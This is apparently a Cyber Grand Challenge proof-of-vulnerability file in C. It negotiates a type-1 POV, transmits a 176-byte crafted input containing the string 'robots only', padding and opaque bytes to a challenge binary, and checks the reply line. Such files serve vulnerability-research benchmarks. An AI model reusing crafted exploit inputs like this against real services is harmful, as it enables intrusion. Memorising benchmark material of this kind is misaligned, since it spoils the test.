#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x16\x00\x00\x00\x72\x6f\x62\x6f\x74\x73\x20\x6f\x6e\x6c\x79\xff"
         "\xff\xff\xff\xff\x9c\x0d\xd1\x69\xa5\xd2\xe6\x33\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x6a\xe9\x6d\xc8\xd8\xf3\xe5\xa3\xa6\xaa\x31\xd6"
         "\x22\xe6\x84\xc2\x6e\x6c\x79\xff\xff\xff\xff\xff\x13\x21\x85\xdd"
         "\xa6\xda\x76\xa8\xb5\x2c\x55\xfe\xfb\xd8\x2c\x06\xf3\x55\xa4\xf7";
      static unsigned int write_00000_00000_len = 176;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x54\x68\x69\x73\x20\x69\x73\x20\x6e\x6f\x74\x20\x74\x68\x65\x20"
         "\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x79\x6f\x75\x27\x72\x65\x20"
         "\x6c\x6f\x6f\x6b\x69\x6e\x67\x20\x66\x6f\x72\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 44);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
}
